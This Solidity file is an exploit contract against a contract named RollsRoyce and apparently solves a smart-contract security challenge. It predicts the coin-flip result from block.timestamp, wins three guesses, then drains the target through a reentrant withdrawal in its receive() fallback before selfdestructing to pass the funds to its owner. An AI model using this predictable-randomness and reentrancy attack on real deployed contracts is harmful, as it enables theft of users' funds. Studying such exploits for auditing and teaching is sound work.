// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {RollsRoyce} from "./RollsRoyce.sol";

contract RollsExploit {
    RollsRoyce public immutable rollsRoyce;
    address private immutable owner;

    constructor(RollsRoyce _rollsRoyce) payable {
        rollsRoyce = _rollsRoyce;
        owner = msg.sender;
    }

    function attack() external {
        uint8 count;
        while (count < 3) {
            RollsRoyce.CoinFlipOption option = RollsRoyce.CoinFlipOption(
                uint256(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
            rollsRoyce.guess{value: 1 ether}(option);
            rollsRoyce.revealResults();
            count++;
        }
        rollsRoyce.withdrawFirstWinPrizeMoneyBonus();
    }

    receive() external payable {
        if (address(rollsRoyce).balance != 0) {
            rollsRoyce.withdrawFirstWinPrizeMoneyBonus();
        }
        selfdestruct(payable(owner));
    }
}
